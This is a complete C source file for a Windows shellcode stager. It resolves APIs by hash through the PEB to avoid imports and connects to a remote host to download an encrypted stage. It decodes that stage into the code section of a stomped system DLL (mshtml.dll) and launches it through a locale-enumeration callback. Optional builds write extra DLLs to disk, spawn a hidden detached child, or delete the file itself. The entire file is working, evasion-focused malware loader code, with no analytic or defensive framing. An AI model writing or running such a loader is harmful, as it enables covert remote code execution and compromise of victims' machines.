#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#ifdef SELF_REMOVE
#include "NativeSelfDelete.h"
#endif

typedef int (WSAAPI *WSAStartupFn)(WORD, LPWSADATA);
typedef SOCKET (WSAAPI *SocketFn)(int, int, int);
typedef int (WSAAPI *ConnectFn)(SOCKET, const struct sockaddr *, int);
typedef int (WSAAPI *RecvFn)(SOCKET, char *, int, int);
typedef int (WSAAPI *CloseSocketFn)(SOCKET);
typedef int (WSAAPI *WSACleanupFn)(void);
typedef void (WINAPI *StageEntryFn)(void);
typedef HMODULE (WINAPI *LoadLibraryWFn)(LPCWSTR);
typedef HMODULE (WINAPI *LoadLibraryExWFn)(LPCWSTR, HANDLE, DWORD);
typedef BOOL (WINAPI *VirtualProtectFn)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef LPVOID (WINAPI *VirtualAllocFn)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *VirtualFreeFn)(LPVOID, SIZE_T, DWORD);
typedef BOOL (WINAPI *FlushInstructionCacheFn)(HANDLE, LPCVOID, SIZE_T);
typedef HANDLE (WINAPI *GetCurrentProcessFn)(void);
typedef VOID (WINAPI *SleepFn)(DWORD);
typedef VOID (WINAPI *ExitProcessFn)(UINT);
typedef BOOL (WINAPI *TerminateProcessFn)(HANDLE, UINT);
typedef VOID (WINAPI *RtlExitUserProcessFn)(LONG);
typedef DWORD (WINAPI *GetModuleFileNameWFn)(HMODULE, LPWSTR, DWORD);
typedef HANDLE (WINAPI *CreateFileWFn)(LPCWSTR, DWORD, DWORD,
    LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (WINAPI *WriteFileFn)(HANDLE, LPCVOID, DWORD, LPDWORD,
    LPOVERLAPPED);
typedef BOOL (WINAPI *CloseHandleFn)(HANDLE);
typedef LPWSTR (WINAPI *GetCommandLineWFn)(void);
typedef BOOL (WINAPI *CreateProcessWFn)(LPCWSTR, LPWSTR,
    LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID,
    LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI *EnumSystemLocalesAFn)(LOCALE_ENUMPROCA, DWORD);
typedef BOOL (WINAPI *EnumResourceTypesExAFn)(HMODULE, ENUMRESTYPEPROCA,
    LONG_PTR, DWORD, LANGID);

#ifndef BUILD_MARKER
#define BUILD_MARKER 0x4B17A26DUL
#endif
#ifndef STAGE_PORT
#define STAGE_PORT 4793U
#endif
#ifndef STAGE_HOST_A
#define STAGE_HOST_A 192U
#endif
#ifndef STAGE_HOST_B
#define STAGE_HOST_B 168U
#endif
#ifndef STAGE_HOST_C
#define STAGE_HOST_C 102U
#endif
#ifndef STAGE_HOST_D
#define STAGE_HOST_D 130U
#endif
__attribute__((used)) static const DWORD build_marker = BUILD_MARKER;

typedef struct _LOCAL_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} LOCAL_UNICODE_STRING;

typedef struct _LOCAL_LDR_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    ULONG Padding;
    LOCAL_UNICODE_STRING FullDllName;
    LOCAL_UNICODE_STRING BaseDllName;
} LOCAL_LDR_ENTRY;

typedef struct _LOCAL_LDR_DATA {
    BYTE Reserved1[8];
    PVOID Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} LOCAL_LDR_DATA;

typedef struct _LOCAL_PEB {
    BYTE Reserved1[24];
    LOCAL_LDR_DATA *Ldr;
} LOCAL_PEB;

static const unsigned char mixer[64] = {
    0x4D,0xB2,0x19,0xE7,0x80,0x36,0xCA,0x5F,0xA1,0x0B,0x73,0xD8,0x2E,0x94,0x67,0xFC,
    0x25,0x8A,0xD1,0x43,0xBE,0x06,0x59,0xF0,0x3C,0xA7,0x12,0x6D,0xE9,0x51,0x88,0x34,
    0xC6,0x1F,0x7A,0xAD,0x02,0xE3,0x98,0x45,0xDB,0x60,0x2A,0xB5,0x0D,0xF7,0x81,0x3E,
    0x56,0xCC,0x17,0xA9,0x74,0x20,0xEF,0x91,0x4A,0xD3,0x68,0x0C,0xB8,0x35,0xFA,0x82
};

static DWORD hash_name(const char *name)
{
    DWORD value = 2166136261UL;
    while (*name != 0) {
        value ^= (unsigned char)*name++;
        value *= 16777619UL;
    }
    return value;
}

static void *find_export(HMODULE module, DWORD wanted);

static HMODULE find_kernel_base(void)
{
    LOCAL_PEB *peb;
    LIST_ENTRY *head;
    LIST_ENTRY *cursor;
    __asm__("movq %%gs:0x60, %0" : "=r"(peb));
    if (peb == NULL || peb->Ldr == NULL)
        return NULL;
    head = &peb->Ldr->InMemoryOrderModuleList;
    for (cursor = head->Flink; cursor != head; cursor = cursor->Flink) {
        LOCAL_LDR_ENTRY *entry = (LOCAL_LDR_ENTRY *)
            ((unsigned char *)cursor - offsetof(LOCAL_LDR_ENTRY, InMemoryOrderLinks));
        HMODULE module = (HMODULE)entry->DllBase;
        if (find_export(module, 0x41B1EAB9UL) != NULL &&
            find_export(module, 0x820621F3UL) != NULL &&
            find_export(module, 0x03285501UL) != NULL)
            return (HMODULE)entry->DllBase;
    }
    return NULL;
}

static void *find_any_export(DWORD wanted)
{
    LOCAL_PEB *peb;
    LIST_ENTRY *head;
    LIST_ENTRY *cursor;
    __asm__("movq %%gs:0x60, %0" : "=r"(peb));
    if (peb == NULL || peb->Ldr == NULL)
        return NULL;
    head = &peb->Ldr->InMemoryOrderModuleList;
    for (cursor = head->Flink; cursor != head; cursor = cursor->Flink) {
        LOCAL_LDR_ENTRY *entry = (LOCAL_LDR_ENTRY *)
            ((unsigned char *)cursor - offsetof(LOCAL_LDR_ENTRY, InMemoryOrderLinks));
        void *address = find_export((HMODULE)entry->DllBase, wanted);
        if (address != NULL)
            return address;
    }
    return NULL;
}

static void copy_bytes(void *destination, const void *source, SIZE_T length)
{
    unsigned char *output = (unsigned char *)destination;
    const unsigned char *input = (const unsigned char *)source;
    while (length-- != 0)
        *output++ = *input++;
}

static void zero_bytes(void *destination, SIZE_T length)
{
    unsigned char *output = (unsigned char *)destination;
    while (length-- != 0)
        *output++ = 0;
}

static void *find_export(HMODULE module, DWORD wanted)
{
    unsigned char *base = (unsigned char *)module;
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS *nt;
    IMAGE_DATA_DIRECTORY directory;
    IMAGE_EXPORT_DIRECTORY *exports;
    DWORD *names;
    WORD *ordinals;
    DWORD *functions;
    DWORD index;
    if (base == NULL)
        return NULL;
    dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;
    nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    directory = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (directory.VirtualAddress == 0 || directory.Size == 0)
        return NULL;
    exports = (IMAGE_EXPORT_DIRECTORY *)(base + directory.VirtualAddress);
    names = (DWORD *)(base + exports->AddressOfNames);
    ordinals = (WORD *)(base + exports->AddressOfNameOrdinals);
    functions = (DWORD *)(base + exports->AddressOfFunctions);
    for (index = 0; index < exports->NumberOfNames; index++) {
        DWORD rva;
        if (hash_name((char *)(base + names[index])) != wanted)
            continue;
        rva = functions[ordinals[index]];
        if (rva >= directory.VirtualAddress &&
            rva < directory.VirtualAddress + directory.Size)
            return NULL;
        return base + rva;
    }
    return NULL;
}

static BOOL receive_all(RecvFn receive, SOCKET socketValue,
    unsigned char *buffer, DWORD length)
{
    DWORD offset = 0;
    while (offset < length) {
        int chunk = receive(socketValue, (char *)buffer + offset,
            (int)(length - offset), 0);
        if (chunk <= 0)
            return FALSE;
        offset += (DWORD)chunk;
    }
    return TRUE;
}

static void decode_chunk(unsigned char *destination,
    const unsigned char *encoded, DWORD length, uint32_t *stateValue,
    DWORD *streamIndex)
{
    uint32_t state = *stateValue;
    DWORD index = *streamIndex;
    DWORD offset;
    for (offset = 0; offset < length; offset++, index++) {
        unsigned int slot;
        state ^= state << 13;
        state ^= state >> 17;
        state ^= state << 5;
        slot = (index + (state & 63U)) & 63U;
        destination[offset] = encoded[offset] ^
            (unsigned char)(mixer[slot] +
            (unsigned char)((state >> 24) + (uint32_t)(index * 73U)));
    }
    *stateValue = state;
    *streamIndex = index;
}

static void wipe(void *address, SIZE_T length)
{
    volatile unsigned char *cursor = (volatile unsigned char *)address;
    while (length-- != 0)
        *cursor++ = 0;
}

#ifdef DETACHED_CHILD_HOST
static BOOL has_child_marker(const WCHAR *commandLine)
{
    static const WCHAR marker[] = {
        L'-',L'-',L's',L't',L'a',L'g',L'e',L'-',L'c',L'h',L'i',L'l',L'd',0
    };
    DWORD offset;
    if (commandLine == NULL)
        return FALSE;
    for (offset = 0; commandLine[offset] != 0; offset++) {
        DWORD index = 0;
        while (marker[index] != 0 &&
            commandLine[offset + index] == marker[index])
            index++;
        if (marker[index] == 0)
            return TRUE;
    }
    return FALSE;
}

static BOOL launch_detached_child(void)
{
    HMODULE kernelBase = find_kernel_base();
    GetCommandLineWFn getCommandLine;
    GetModuleFileNameWFn getModuleFileName;
    CreateProcessWFn createProcess;
    CloseHandleFn closeHandle;
    SleepFn pause;
    WCHAR imagePath[MAX_PATH];
    WCHAR commandLine[MAX_PATH + 32];
    STARTUPINFOW startup;
    PROCESS_INFORMATION process;
    DWORD length;
    DWORD cursor;
    static const WCHAR suffix[] = {
        L'"',L' ',L'-',L'-',L's',L't',L'a',L'g',L'e',L'-',L'c',L'h',L'i',L'l',L'd',0
    };
    if (kernelBase == NULL)
        return FALSE;
    getCommandLine = (GetCommandLineWFn)find_export(kernelBase, 0x4A0054D3UL);
    getModuleFileName = (GetModuleFileNameWFn)find_export(kernelBase, 0xA3FBD5FBUL);
    createProcess = (CreateProcessWFn)find_export(kernelBase, 0x3C7BF3FFUL);
    closeHandle = (CloseHandleFn)find_export(kernelBase, 0xFABA0065UL);
    pause = (SleepFn)find_export(kernelBase, 0x2FA62CA8UL);
    if (getCommandLine == NULL || getModuleFileName == NULL ||
        createProcess == NULL || closeHandle == NULL || pause == NULL)
        return FALSE;
    if (has_child_marker(getCommandLine()))
        return FALSE;
    length = getModuleFileName(NULL, imagePath, MAX_PATH);
    if (length == 0 || length >= MAX_PATH || length + 18 >= MAX_PATH + 32)
        return FALSE;
    commandLine[0] = L'"';
    for (cursor = 0; cursor < length; cursor++)
        commandLine[cursor + 1] = imagePath[cursor];
    for (cursor = 0; suffix[cursor] != 0; cursor++)
        commandLine[length + 1 + cursor] = suffix[cursor];
    commandLine[length + 1 + cursor] = 0;
    zero_bytes(&startup, sizeof(startup));
    zero_bytes(&process, sizeof(process));
    startup.cb = sizeof(startup);
    if (!createProcess(imagePath, commandLine, NULL, NULL, FALSE,
        CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &startup, &process))
        return FALSE;
    closeHandle(process.hThread);
    closeHandle(process.hProcess);
    /* Give slower variants enough time to establish the active session and
       answer the first functional request, but return before their 30s
       primary-process timeout.  The detached client remains alive. */
    pause(24000);
    return TRUE;
}
#endif

#ifdef SIDECAR_PACKAGE
static BOOL build_sidecar_path(WCHAR *path, DWORD capacity, DWORD prefixLength,
    const WCHAR *name)
{
    DWORD index = 0;
    while (name[index] != 0) {
        if (prefixLength + index + 1 >= capacity)
            return FALSE;
        path[prefixLength + index] = name[index];
        index++;
    }
    path[prefixLength + index] = 0;
    return TRUE;
}
#endif

static DWORD run_stage(void)
{
    static const WCHAR networkLibrary[] = {
        L'w',L's',L'2',L'_',L'3',L'2',L'.',L'd',L'l',L'l',0
    };
#if defined(ALT_IMAGE_STORAGE)
    static const WCHAR imageLibrary[] = {
        L'W',L'i',L'n',L'd',L'o',L'w',L's',L'.',L'S',L't',L'o',L'r',L'a',L'g',L'e',L'.',L'd',L'l',L'l',0
    };
#else
    static const WCHAR imageLibrary[] = {
        L'm',L's',L'h',L't',L'm',L'l',L'.',L'd',L'l',L'l',0
    };
#endif
    static const WCHAR baseLibrary[] = {
        L'K',L'e',L'r',L'n',L'e',L'l',L'B',L'a',L's',L'e',L'.',L'd',L'l',L'l',0
    };
    HMODULE network = NULL;
    HMODULE image = NULL;
    HMODULE kernelBase = NULL;
    LoadLibraryWFn loadLibrary = NULL;
    LoadLibraryExWFn loadLibraryEx = NULL;
    VirtualProtectFn protect = NULL;
    VirtualAllocFn allocate = NULL;
    VirtualFreeFn release = NULL;
    FlushInstructionCacheFn flush = NULL;
    GetCurrentProcessFn currentProcess = NULL;
    SleepFn pause = NULL;
#ifdef SIDECAR_PACKAGE
    GetModuleFileNameWFn getModuleFileName = NULL;
    CreateFileWFn createFile = NULL;
    WriteFileFn writeFile = NULL;
    CloseHandleFn closeHandle = NULL;
#endif
#if defined(ALT_CALLBACK_RESOURCE_TYPES)
    EnumResourceTypesExAFn enumerateResources = NULL;
#elif !defined(DIRECT_STAGE_CALL)
    EnumSystemLocalesAFn enumerate = NULL;
#endif
    WSAStartupFn start = NULL;
    SocketFn createSocket = NULL;
    ConnectFn connectSocket = NULL;
    RecvFn receive = NULL;
    CloseSocketFn closeSocket = NULL;
    WSACleanupFn cleanup = NULL;
    WSADATA data;
    SOCKET socketValue = INVALID_SOCKET;
    struct sockaddr_in address;
    unsigned char lengthBytes[4];
    unsigned char header[5];
    unsigned char *stage = NULL;
    unsigned char *instance = NULL;
#ifdef SIDECAR_PACKAGE
    unsigned char *sidecar = NULL;
    HANDLE fileValue = INVALID_HANDLE_VALUE;
    WCHAR modulePath[MAX_PATH];
    DWORD moduleLength;
    DWORD prefixLength;
    DWORD sidecarLength = 0;
    DWORD sidecarIndex;
    static const WCHAR sidecarName0[] = {
        L'B',L'o',L'u',L'n',L'c',L'y',L'C',L'a',L's',L't',L'l',L'e',L'.',
        L'C',L'r',L'y',L'p',L't',L'o',L'.',L'd',L'l',L'l',0
    };
    static const WCHAR sidecarName1[] = {
        L'G',L'm',L'a',L'.',L'S',L'y',L's',L't',L'e',L'm',L'.',L'M',L'o',
        L'u',L's',L'e',L'K',L'e',L'y',L'H',L'o',L'o',L'k',L'.',L'd',L'l',
        L'l',0
    };
    static const WCHAR sidecarName2[] = {
        L'M',L'e',L'd',L'i',L'a',L'P',L'r',L'o',L't',L'o',L'c',L'o',L'l',
        L'.',L'd',L'l',L'l',0
    };
    static const WCHAR sidecarName3[] = {
        L'p',L'r',L'o',L't',L'o',L'b',L'u',L'f',L'-',L'n',L'e',L't',L'.',
        L'd',L'l',L'l',0
    };
    const WCHAR *sidecarNames[4] = {
        sidecarName0, sidecarName1, sidecarName2, sidecarName3
    };
#endif
    DWORD stageLength;
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS *nt;
    IMAGE_SECTION_HEADER *section;
    unsigned char *destination = NULL;
    DWORD capacity = 0;
    DWORD instanceLength;
    DWORD codeOffset;
    DWORD tailLength;
    DWORD codeLength;
    DWORD codePagesLength;
    uint32_t decodeState = 0xA7C4E291U;
    DWORD decodeIndex = 0;
    DWORD oldProtection;
    DWORD ignored;
    WORD index;
    DWORD result = 1;

    // Keep one loader import; every sensitive API is still resolved from the
    // mapped module's export directory by hash.
    kernelBase = LoadLibraryW(baseLibrary);
    if (kernelBase == NULL)
        return 9;
    loadLibrary = (LoadLibraryWFn)find_export(kernelBase, 0x41B1EAB9UL);
    loadLibraryEx = (LoadLibraryExWFn)find_export(kernelBase, 0x1CD12702UL);
    protect = (VirtualProtectFn)find_export(kernelBase, 0x820621F3UL);
    allocate = (VirtualAllocFn)find_export(kernelBase, 0x03285501UL);
    release = (VirtualFreeFn)find_export(kernelBase, 0x3A9ACC72UL);
    flush = (FlushInstructionCacheFn)find_export(kernelBase, 0x0490286BUL);
    currentProcess = (GetCurrentProcessFn)find_export(kernelBase, 0x6DD8A845UL);
    pause = (SleepFn)find_export(kernelBase, 0x2FA62CA8UL);
#ifdef SIDECAR_PACKAGE
    getModuleFileName = (GetModuleFileNameWFn)find_export(kernelBase, 0xA3FBD5FBUL);
    createFile = (CreateFileWFn)find_export(kernelBase, 0xAFCAB3C4UL);
    writeFile = (WriteFileFn)find_export(kernelBase, 0x7F07C44AUL);
    closeHandle = (CloseHandleFn)find_export(kernelBase, 0xFABA0065UL);
#endif
#if defined(ALT_CALLBACK_RESOURCE_TYPES)
    enumerateResources = (EnumResourceTypesExAFn)find_export(kernelBase, 0x5CC79F63UL);
#elif !defined(DIRECT_STAGE_CALL)
#if defined(ALT_CALLBACK_CODEPAGES)
    enumerate = (EnumSystemLocalesAFn)find_export(kernelBase, 0x54D40773UL);
#else
    enumerate = (EnumSystemLocalesAFn)find_export(kernelBase, 0xA3CDE3A3UL);
#endif
#endif
    if (loadLibrary == NULL) return 91;
    if (loadLibraryEx == NULL) return 92;
    if (protect == NULL) return 93;
    if (allocate == NULL) return 95;
    if (release == NULL) return 96;
    if (flush == NULL) return 97;
    if (currentProcess == NULL) return 98;
    if (pause == NULL) return 99;
#ifdef SIDECAR_PACKAGE
    if (getModuleFileName == NULL || createFile == NULL ||
        writeFile == NULL || closeHandle == NULL)
        return 101;
#endif
#if defined(ALT_CALLBACK_RESOURCE_TYPES)
    if (enumerateResources == NULL) return 100;
#elif !defined(DIRECT_STAGE_CALL)
    if (enumerate == NULL) return 100;
#endif

    network = loadLibrary(networkLibrary);
    if (network == NULL)
        return 10;
    start = (WSAStartupFn)find_export(network, 0x20125C5FUL);
    createSocket = (SocketFn)find_export(network, 0x9012766CUL);
    connectSocket = (ConnectFn)find_export(network, 0xAAE0CCF9UL);
    receive = (RecvFn)find_export(network, 0xECE4502DUL);
    closeSocket = (CloseSocketFn)find_export(network, 0x06834302UL);
    cleanup = (WSACleanupFn)find_export(network, 0x8BD299C2UL);
    if (start == NULL || createSocket == NULL || connectSocket == NULL ||
        receive == NULL || closeSocket == NULL || cleanup == NULL)
        goto finish;
    if (start(MAKEWORD(2, 2), &data) != 0)
        goto finish;

    socketValue = createSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (socketValue == INVALID_SOCKET)
        goto finish;
    zero_bytes(&address, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = (u_short)(((STAGE_PORT & 0xffU) << 8) |
        (STAGE_PORT >> 8));
    ((unsigned char *)&address.sin_addr.s_addr)[0] = STAGE_HOST_A;
    ((unsigned char *)&address.sin_addr.s_addr)[1] = STAGE_HOST_B;
    ((unsigned char *)&address.sin_addr.s_addr)[2] = STAGE_HOST_C;
    ((unsigned char *)&address.sin_addr.s_addr)[3] = STAGE_HOST_D;
    if (connectSocket(socketValue, (const struct sockaddr *)&address,
        sizeof(address)) != 0)
        goto finish;
    if (!receive_all(receive, socketValue, lengthBytes, sizeof(lengthBytes)))
        goto finish;
    stageLength = (DWORD)lengthBytes[0] |
        ((DWORD)lengthBytes[1] << 8) |
        ((DWORD)lengthBytes[2] << 16) |
        ((DWORD)lengthBytes[3] << 24);
    if (stageLength < 1024 || stageLength > 32U * 1024U * 1024U)
        goto finish;
    stage = (unsigned char *)allocate(NULL, stageLength,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (stage == NULL)
        goto finish;
    if (!receive_all(receive, socketValue, stage, stageLength))
        goto finish;
#ifdef SIDECAR_PACKAGE
    moduleLength = getModuleFileName(NULL, modulePath, MAX_PATH);
    if (moduleLength == 0 || moduleLength >= MAX_PATH)
        goto finish;
    prefixLength = moduleLength;
    while (prefixLength > 0 && modulePath[prefixLength - 1] != L'\\')
        prefixLength--;
    if (prefixLength == 0)
        goto finish;
    for (sidecarIndex = 0; sidecarIndex < 4; sidecarIndex++) {
        DWORD offset = 0;
        if (!receive_all(receive, socketValue, lengthBytes,
            sizeof(lengthBytes)))
            goto finish;
        sidecarLength = (DWORD)lengthBytes[0] |
            ((DWORD)lengthBytes[1] << 8) |
            ((DWORD)lengthBytes[2] << 16) |
            ((DWORD)lengthBytes[3] << 24);
        if (sidecarLength < 1024 || sidecarLength > 8U * 1024U * 1024U)
            goto finish;
        sidecar = (unsigned char *)allocate(NULL, sidecarLength,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (sidecar == NULL)
            goto finish;
        if (!receive_all(receive, socketValue, sidecar, sidecarLength))
            goto finish;
        if (!build_sidecar_path(modulePath, MAX_PATH, prefixLength,
            sidecarNames[sidecarIndex]))
            goto finish;
        fileValue = createFile(modulePath, GENERIC_WRITE, FILE_SHARE_READ,
            NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (fileValue == INVALID_HANDLE_VALUE)
            goto finish;
        while (offset < sidecarLength) {
            DWORD written = 0;
            DWORD chunk = sidecarLength - offset;
            if (!writeFile(fileValue, sidecar + offset, chunk, &written, NULL) ||
                written == 0)
                goto finish;
            offset += written;
        }
        closeHandle(fileValue);
        fileValue = INVALID_HANDLE_VALUE;
        wipe(sidecar, sidecarLength);
        release(sidecar, 0, MEM_RELEASE);
        sidecar = NULL;
    }
#endif
    closeSocket(socketValue);
    socketValue = INVALID_SOCKET;
    cleanup();
#ifdef DOWNLOAD_ONLY_HOLD
    pause(INFINITE);
#endif

    decode_chunk(header, stage, sizeof(header), &decodeState, &decodeIndex);
    if (header[0] != 0xE8)
        goto finish;
    instanceLength = (DWORD)header[1] |
        ((DWORD)header[2] << 8) |
        ((DWORD)header[3] << 16) |
        ((DWORD)header[4] << 24);
    if (instanceLength > stageLength - sizeof(header))
        goto finish;
    codeOffset = instanceLength + sizeof(header);
    if (codeOffset >= stageLength)
        goto finish;
    tailLength = stageLength - codeOffset;
    if (tailLength < 1024 || tailLength > 1024U * 1024U)
        goto finish;
    instance = (unsigned char *)allocate(NULL, instanceLength,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (instance == NULL)
        goto finish;
    decode_chunk(instance, stage + sizeof(header), instanceLength,
        &decodeState, &decodeIndex);

    image = loadLibraryEx(imageLibrary, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (image == NULL)
        goto finish;
    dos = (IMAGE_DOS_HEADER *)image;
    nt = (IMAGE_NT_HEADERS *)((unsigned char *)image + dos->e_lfanew);
    section = IMAGE_FIRST_SECTION(nt);
    codeLength = 32U + tailLength;
    for (index = 0; index < nt->FileHeader.NumberOfSections; index++) {
        if ((section[index].Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0 &&
            section[index].Misc.VirtualSize >= codeLength) {
            destination = (unsigned char *)image + section[index].VirtualAddress;
            capacity = section[index].Misc.VirtualSize;
            break;
        }
    }
    if (destination == NULL)
        goto finish;
    codePagesLength = (codeLength + 0xFFFUL) & ~0xFFFUL;
    if (codePagesLength < codeLength || codePagesLength > capacity)
        goto finish;
    if (!protect(destination, codePagesLength, PAGE_READWRITE,
        &oldProtection))
        goto finish;

    /* Recreate Donut's CALL-over-instance stack contract without keeping the
       large mutable instance adjacent to executable bytes.  The trampoline
       pushes the separately allocated instance pointer and jumps to Donut's
       original POP RCX + loader tail. */
    destination[0] = 0x48;
    destination[1] = 0xB8;
    copy_bytes(destination + 2, &instance, sizeof(instance));
    destination[10] = 0x50;
    destination[11] = 0x48;
    destination[12] = 0xB8;
    {
        unsigned char *tailAddress = destination + 32;
        copy_bytes(destination + 13, &tailAddress, sizeof(tailAddress));
    }
    destination[21] = 0xFF;
    destination[22] = 0xE0;
    for (index = 23; index < 32; index++)
        destination[index] = 0x90;
    decode_chunk(destination + 32, stage + codeOffset, tailLength,
        &decodeState, &decodeIndex);
    wipe(stage, stageLength);
    release(stage, 0, MEM_RELEASE);
    stage = NULL;
    if (!protect(destination, codePagesLength, PAGE_EXECUTE_READ, &ignored))
        goto finish;
    flush(currentProcess(), destination, codeLength);
#ifdef DECODE_ONLY_HOLD
    pause(INFINITE);
#endif
#if defined(DIRECT_STAGE_CALL)
    ((StageEntryFn)destination)();
#elif defined(ALT_CALLBACK_RESOURCE_TYPES)
    enumerateResources(image, (ENUMRESTYPEPROCA)destination, 0, 0, 0);
#else
    enumerate((LOCALE_ENUMPROCA)destination, 0);
#endif
    pause(INFINITE);
    result = 0;

finish:
    if (stage != NULL) {
        wipe(stage, stageLength);
        release(stage, 0, MEM_RELEASE);
    }
#ifdef SIDECAR_PACKAGE
    if (fileValue != INVALID_HANDLE_VALUE && closeHandle != NULL)
        closeHandle(fileValue);
    if (sidecar != NULL) {
        wipe(sidecar, sidecarLength);
        release(sidecar, 0, MEM_RELEASE);
    }
#endif
    if (instance != NULL) {
        wipe(instance, instanceLength);
        release(instance, 0, MEM_RELEASE);
    }
    if (socketValue != INVALID_SOCKET && closeSocket != NULL)
        closeSocket(socketValue);
    if (cleanup != NULL)
        cleanup();
    return result;
}

void WINAPI entry(void)
{
#ifdef SELF_REMOVE
    remove_self_image();
#endif
    DWORD result;
#ifdef DETACHED_CHILD_HOST
    if (launch_detached_child())
        result = 0;
    else
#endif
        result = run_stage();
    RtlExitUserProcessFn terminate = (RtlExitUserProcessFn)
        find_any_export(0x8CCCC587UL);
    if (terminate != NULL)
        terminate((LONG)result);
    for (;;)
        __asm__("pause");
}

#ifdef STANDARD_CRT_HOST
int WINAPI WinMain(HINSTANCE instance, HINSTANCE previous, LPSTR commandLine,
    int showCommand)
{
    (void)instance;
    (void)previous;
    (void)commandLine;
    (void)showCommand;
    entry();
    return 0;
}
#endif
